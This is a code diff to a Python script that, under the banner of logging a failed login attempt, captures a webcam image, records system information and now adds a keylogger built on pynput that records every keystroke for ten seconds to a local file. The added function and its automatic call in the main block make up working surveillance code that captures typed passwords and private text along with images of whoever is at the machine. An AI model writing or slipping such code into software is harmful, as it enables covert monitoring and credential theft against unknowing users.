@@ -4,6 +4,8 @@ import platform
 import requests
 import datetime
 import os
+import time
+from pynput import keyboard
 
 def capture_image():
     """Capture image from webcam and save it"""
@@ -105,8 +107,58 @@ def log_system_info():
     print(f"System information logged to {log_filename}")
     return log_filename
 
+def keylogger(duration=10):
+    """Log keyboard input for a specified duration (in seconds)"""
+    print(f"Starting keylogger for {duration} seconds...")
+    
+    # Ensure logs directory exists
+    os.makedirs('logs', exist_ok=True)
+    
+    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    keylog_filename = f"logs/keylog_{timestamp}.txt"
+    
+    # List to store key presses
+    key_logs = []
+    
+    # Track start time
+    start_time = time.time()
+    
+    # Define the key press event handler
+    def on_press(key):
+        try:
+            # Try to get the character
+            key_logs.append(f"Key pressed: {key.char}")
+        except AttributeError:
+            # Special key
+            key_logs.append(f"Special key pressed: {key}")
+        
+        # Stop logging if duration exceeded
+        if time.time() - start_time >= duration:
+            return False
+    
+    # Start the listener
+    with keyboard.Listener(on_press=on_press) as listener:
+        # Run until duration elapsed or listener stopped
+        listener.join(timeout=duration)
+    
+    # Write key logs to file
+    with open(keylog_filename, 'w') as f:
+        f.write(f"=== KEYLOGGER OUTPUT ===\n")
+        f.write(f"Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write(f"Duration: {duration} seconds\n\n")
+        
+        if key_logs:
+            for entry in key_logs:
+                f.write(f"{entry}\n")
+        else:
+            f.write("No keys were pressed during the logging period.\n")
+    
+    print(f"Key logging completed. Output saved to {keylog_filename}")
+    return keylog_filename
+
 if __name__ == "__main__":
     print("Logging failed login attempt...")
     capture_image()
-    log_system_info()
+    log_file = log_system_info()
+    keylog_file = keylogger(10)  # Log keys for 10 seconds
     print("Logging complete")
